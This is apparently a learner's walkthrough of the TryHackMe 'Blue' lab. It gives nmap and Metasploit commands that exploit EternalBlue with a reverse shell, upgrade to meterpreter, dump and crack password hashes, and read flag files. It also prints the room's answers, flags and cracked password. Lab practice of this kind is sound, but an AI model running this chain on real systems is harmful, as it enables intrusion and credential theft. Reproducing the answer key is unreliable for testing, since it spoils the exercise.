# Blue

BLUE (Eternal blue)
https://tryhackme.com/room/blue

IP: 10.10.200.69
Found: Jon@alqfna22
------------------------------------------------------------------------------------------------------------------------------------------
This is a Windows vulnerability, pretty big, and well-known. If you want to do over THM machine or over own I let you decide.  If you do over THM machine skip to Task 1 if so... Do remember that my IP is probably not the same as yours, so remember changing that in your scans. I did actually both because I had some problems, so some pictures may be from my own or from a VM.
Deploy the machine on THM so you get the IP address.

1.	Download your VPN file on THM if you haven’t done that already, find it and do following command: sudo openvpn FILE.ovpn
2.	then hit your password and you ready to dive in to TASK 1…
TASK 1:
1.	Scan the machine. 
I use NMAP for this, the commands are simple and we will use -sC for scrips, and -sV for versions. IF you have problems add -Pn which will avoid ping. You will also find the username that we need for future. I needed to do this:
nmap -Pn -sC -sV 10.10.200.69

2.	How many ports are open with a port number under 1000? 
Answer: 3 (135,139 and 445)
3.	What is this machine vulnerable to?
By just googling “Microsoft eternalblue” I could find what they had named this. Its CVE is also revealed if you google little bit more and is “CVE-2017-0144” but in answer you find the Microsoft vulnerability name.
Answer: ms17-010


TASK 2:
1.	Start Metasploit
Just write msfconsole, and it will trigger Metasploit to start. 
2.	Find the exploitation code we will run against the machine. What is the full path of the code?

search ms17-010
use exploit/windows/smb/ms17_010_eternalblue (OR use 0)
set payload windows/x64/shell/reverse_tcp (It will default on this anyway)
show options (to see what is required to do, usually RHOST also LHOST in my case)
set RHOST 10.10.200.69
set LHOST IP (Do an sudo ifconfig do find out in tun0) 
run (Take a time now and answer the questions under)

The answer you could find from the first command.
Answer: exploit/windows/smb/ms17_010_eternalblue

3.	Show options and set the one required value. What is the name of this value?
Answer: RHOSTS

4.	Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

Sadly this happened me, you will get this fail message, I tried to restart the machine and use another IP it didn’t work. After some research I noticed my local IP was set to wrong IP, it should be the IP you find from your ifconfig, which is from tun0, here I did an set LHOST to that IP and it worked…
At my machine it said “WIN” Which means it successfully runned the exploit without any problems.  And you should now by hitting enter have a basic shell and should look like C:\Windows\system32> 
From here do an: whoami, you will see your nt authority\system basicly root.
Now you can enter: background and hit y, to background this progress (or do as above CTRL + Z). This is something that you can do within Metasploit which is pretty good to remember for future. This allows you to go back to your Metasploit prompt.
TASK 3:
1.	What is the name of the post module we will use?

search shell_to_meterpreter 
use post/multi/manage/shell_to_meterpreter (here you also find the answer to this question) 
show options (From here you see what we need to set, the session option, the LHOST is not required in this case)
sessions (You should now have a session to use)
set SESSION 1
run
shell
whoami (You are NT authority)
exit (We need to go back to meterpreter now, for task 4

They will tell you to migrate, but you do not need to migrate here, because we have such a strong reverse shell already. You could do that if you want to learn more…

Answer: post/multi/manage/shell_to_meterpreter
2.	what option are we required to change?
Answer: SESSION
3.	Set the required option, you may need to list all of the sessions to find your target here. 
4.	Run! If this doesn't work, try completing the exploit from the previous task once more.
5.	Once the meterpreter shell conversion completes, select that session for use.
6.	Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
7.	List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
8.	Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
TASK 4:
1.	Within meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

hashdump (here you find the user as you show earlier, Jon, but you also find out the hashes of the passwords)
Answer: Jon

2.	Copy this password hash to a file and research how to crack it. What is the cracked password?
Take the hash from Jon:1000 but only the 2nd part and crack it from, I did all just to see if I could anything else but I only got Jons password. You could do this over JohnTheRipper but for this lesson we will do this over www.crackstation.net.
Answer: alqfna22

TASK 5:
Flag 1: flag{access_the_machine}
The flags you find by doing following… This was tricky, the hint says “if I can C it” which made me think of the C drive…
cd C:/
dir (Do you see the flag?)
cat flag1.txt

Flag 2: flag{sam_database_elevated_access}
For flag 2, there is something called sam location in Windows, which I used for storing hashes of passwords and users. You can google this to explore more about this.
cd C:/Windows/System32/config
dir
cat flag2.txt

Flag 3: flag{admin_documents_can_be_valuable}
For flag 3, its much easier to know where the flag is, and because were using meterpreter there is a nice tool to use… The search function… search -h
Search -f flag*.txt (You should see all 3 flags from here, but flag 3 is in Documents folder of Jon)
Having problems cat that out? Well I did also have that problem, just add this \…
cat c:\\Users\\Jon\\Documents\\flag3.txt
---------------------------------------------------------------------------------------------------------
